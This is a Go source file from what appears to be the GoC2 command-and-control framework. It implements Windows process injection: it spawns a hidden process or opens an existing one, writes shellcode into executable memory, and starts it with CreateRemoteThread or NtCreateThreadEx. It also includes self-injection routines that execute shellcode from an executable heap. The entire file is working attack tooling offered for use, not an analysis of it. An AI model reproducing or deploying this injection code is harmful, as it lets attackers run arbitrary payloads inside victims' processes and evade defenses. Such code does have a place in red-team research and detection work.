//go:build windows
// +build windows

package processinjection

import (
	"bufio"
	"errors"
	"fmt"
	"log"
	"os/exec"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/latortuga71/GoC2/pkg/rawapi"
	"github.com/latortuga71/GoC2/pkg/winapi"
	"golang.org/x/sys/windows"
)

func SpawnInjectReadPipe(shellcode []byte, exeToSpawn string) (string, error) {
	cmd := exec.Command(exeToSpawn)
	cmd.SysProcAttr = new(syscall.SysProcAttr)
	cmd.SysProcAttr.HideWindow = true
	stdout, err := cmd.StdoutPipe()
	stderr, err := cmd.StderrPipe()
	if err != nil {
		return "", err
	}
	err = cmd.Start()
	if err != nil {
		return "", err
	}
	pidStr := strconv.Itoa(cmd.Process.Pid)
	// now we inject thread and wait on it.
	hThread, err := RemoteInjectReturnThread(shellcode, pidStr)
	if err != nil {
		return "", err
	}
	// now we wait for our thread to finish then send a
	var exitCode uint32
	var STILL_RUNNING uint32 = 259
	for {
		_, err := winapi.GetExitCodeThread(syscall.Handle(hThread), &exitCode)
		if err != nil && !strings.Contains(err.Error(), "operation completed successfully") {
			log.Fatalln(err.Error())
		}
		if exitCode == STILL_RUNNING {
			time.Sleep(1000 * time.Millisecond)
		} else {
			break
		}
	}
	// kill the process and then read from pipes.
	cmd.Process.Kill()
	stderrBuff := bufio.NewScanner(stderr)
	stdoutBuff := bufio.NewScanner(stdout)
	var allText []string
	allText = append(allText, "\n[+] Fork and run completed.\n")
	for stderrBuff.Scan() {
		allText = append(allText, stderrBuff.Text())
	}
	for stdoutBuff.Scan() {
		allText = append(allText, stdoutBuff.Text())
	}
	completed := strings.Join(allText, "\n")
	return completed, nil
}

func SpawnInject(shellcode []byte, exeToSpawn string) (string, error) {
	arg0, err := syscall.UTF16PtrFromString(exeToSpawn)
	if err != nil {
		return "", err
	}
	flags := uint32(syscall.CREATE_UNICODE_ENVIRONMENT)
	si := new(windows.StartupInfo)
	si.Cb = uint32(unsafe.Sizeof(*si))
	pi := new(windows.ProcessInformation)
	err = windows.CreateProcess(arg0, arg0, nil, nil, false, flags, nil, nil, si, pi)
	if err != nil {
		return "", err
	}
	fmt.Println(pi.ProcessId)
	pidStr := strconv.Itoa(int(pi.ProcessId))
	return RemoteInject(shellcode, pidStr)
}

func RemoteInjectReturnThread(shellcode []byte, pid string) (syscall.Handle, error) {
	intpid, err := strconv.Atoi(pid)
	if err != nil {
		return 0, err
	}
	var rights uint32 = windows.PROCESS_CREATE_THREAD |
		windows.PROCESS_QUERY_INFORMATION |
		windows.PROCESS_VM_OPERATION |
		windows.PROCESS_VM_WRITE |
		windows.PROCESS_VM_READ
	var inheritHandle uint32 = 0
	procHandle, err := winapi.OpenProcess(rights, inheritHandle, uint32(intpid))
	if procHandle == 0 {
		return 0, err
	}
	var flAllocationType uint32 = windows.MEM_COMMIT | windows.MEM_RESERVE
	var flProtect uint32 = windows.PAGE_EXECUTE_READWRITE
	//var newFlProtect uint32 = windows.PAGE_EXECUTE_READWRITE
	shellcodeLen := len(shellcode)
	lpBaseAddress, err := winapi.VirtualAllocEx(procHandle, 0, uint32(shellcodeLen), flAllocationType, flProtect)
	if lpBaseAddress == 0 {
		return 0, err
	}
	var nBytesWritten uint32
	writeMem, err := winapi.WriteProcessMemory(
		procHandle,
		lpBaseAddress,
		(uintptr)(unsafe.Pointer(&shellcode[0])),
		uint32(shellcodeLen),
		&nBytesWritten)
	if !writeMem {
		return 0, err
	}
	var threadId uint32 = 0
	var dwCreationFlags uint32 = 0
	thread, err := winapi.CreateRemoteThread(
		procHandle,
		uintptr(winapi.NullRef),
		0,
		lpBaseAddress,
		uintptr(winapi.NullRef),
		dwCreationFlags,
		&threadId)
	if thread == 0 {
		return 0, err
	}
	return thread, nil
}

func RemoteInject(shellcode []byte, pid string) (string, error) {
	log.Printf("Remote Inject %s\n", pid)
	intpid, err := strconv.Atoi(pid)
	if err != nil {
		return "", err
	}
	var rights uint32 = windows.PROCESS_CREATE_THREAD |
		windows.PROCESS_QUERY_INFORMATION |
		windows.PROCESS_VM_OPERATION |
		windows.PROCESS_VM_WRITE |
		windows.PROCESS_VM_READ
	var inheritHandle uint32 = 0
	procHandle, err := winapi.OpenProcess(rights, inheritHandle, uint32(intpid))
	if procHandle == 0 {
		return "", err
	}
	log.Printf("Got past open process\n")
	var flAllocationType uint32 = windows.MEM_COMMIT | windows.MEM_RESERVE
	var flProtect uint32 = windows.PAGE_EXECUTE_READWRITE
	var newFlProtect uint32 = windows.PAGE_EXECUTE_READWRITE
	shellcodeLen := len(shellcode)
	lpBaseAddress, err := winapi.VirtualAllocEx(
		procHandle,
		uintptr(winapi.NullRef),
		uint32(shellcodeLen),
		flAllocationType,
		flProtect)
	log.Println(err)
	if lpBaseAddress == 0 {
		return "", err
	}
	log.Printf("Got past virtual alloc\n")
	var nBytesWritten *uint32
	writeMem, err := winapi.WriteProcessMemory(
		procHandle,
		lpBaseAddress,
		(uintptr)(unsafe.Pointer(&shellcode[0])),
		uint32(shellcodeLen),
		nBytesWritten)
	if !writeMem {
		return "", err
	}
	log.Printf("Got past write process memory\n")
	var threadId uint32 = 0
	var dwCreationFlags uint32 = 0
	thread, err := winapi.CreateRemoteThread(
		procHandle,
		uintptr(winapi.NullRef),
		0,
		lpBaseAddress,
		uintptr(winapi.NullRef),
		dwCreationFlags,
		&threadId)
	if thread == 0 {
		return "", err
	}
	log.Printf("Got past create remote thread\n")
	go func() {
		windows.WaitForSingleObject(windows.Handle(thread), windows.INFINITE)
		winapi.VirtualProtectEx(
			procHandle,
			lpBaseAddress,
			uint32(shellcodeLen),
			newFlProtect,
			&flProtect)
		windows.CloseHandle(windows.Handle(thread))
		windows.CloseHandle(windows.Handle(procHandle))
	}()
	log.Printf("right before success")
	return "[+] Success", nil
}

func SelfInject(shellcode []byte) (string, error) {
	procHandle := winapi.GetCurrentProcess()
	if procHandle == 0 {
		return "", errors.New("Failed to get handle to current process.")
	}
	shellcodeLen := len(shellcode)
	heap, err := winapi.HeapCreate(winapi.HEAP_CREATE_ENABLE_EXECUTE, uint32(shellcodeLen), 0)
	if heap == 0 {
		return "", err
	}

	memoryAddress, err := winapi.HeapAlloc(heap, winapi.HEAP_ZERO_MEMORY, uint32(shellcodeLen))
	if memoryAddress == 0 {
		return "", err
	}
	err = winapi.RtlCopyMemory(uintptr(heap), uintptr(unsafe.Pointer(&shellcode[0])), uint32(shellcodeLen))
	var threadId uint32 = 0
	var dwCreationFlags uint32 = 0
	go func() {
		winapi.CreateThread(
			uintptr(winapi.NullRef),
			0,
			uintptr(heap),
			uintptr(winapi.NullRef),
			dwCreationFlags,
			&threadId)
	}()
	return "[+] Success", nil
}

func RawSelfInject(shellcode []byte) (string, error) {
	//var baseA uintptr
	//var zerob uint32 = 0
	//regionsize := uint32(len(shellcode))
	/*
		err1 := rawapi.NtAllocateVirtualMemory(rawapi.ThisThread, &baseA, zerob, &regionsize, uint32(rawapi.MemCommit|rawapi.Memreserve), syscall.PAGE_EXECUTE_READWRITE)
		if err1 != nil {
			return "", err1
		}
	*/
	shellcodeLen := len(shellcode)
	heap, err := winapi.HeapCreate(winapi.HEAP_CREATE_ENABLE_EXECUTE, uint32(shellcodeLen), 0)
	if heap == 0 {
		return "", err
	}

	baseA, err := winapi.HeapAlloc(heap, winapi.HEAP_ZERO_MEMORY, uint32(shellcodeLen))
	if baseA == 0 {
		return "", err
	}
	var written uint32
	err2 := rawapi.NtWriteVirtualMemory(rawapi.ThisThread, baseA, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), &written)
	if err2 != nil {
		return "", err2
	}
	var hhosthread uintptr
	err3 := rawapi.NtCreateThreadEx( //NtCreateThreadEx
		&hhosthread,       //hthread
		0x1FFFFF,          //desiredaccess
		0,                 //objattributes
		rawapi.ThisThread, //processhandle
		baseA,             //lpstartaddress
		0,                 //lpparam
		uintptr(0),        //createsuspended
		0,                 //zerobits
		0,                 //sizeofstackcommit
		0,                 //sizeofstackreserve
		0,                 //lpbytesbuffer
	)
	if err3 != nil {
		return "", err3
	}
	return "[+] Success", nil
}
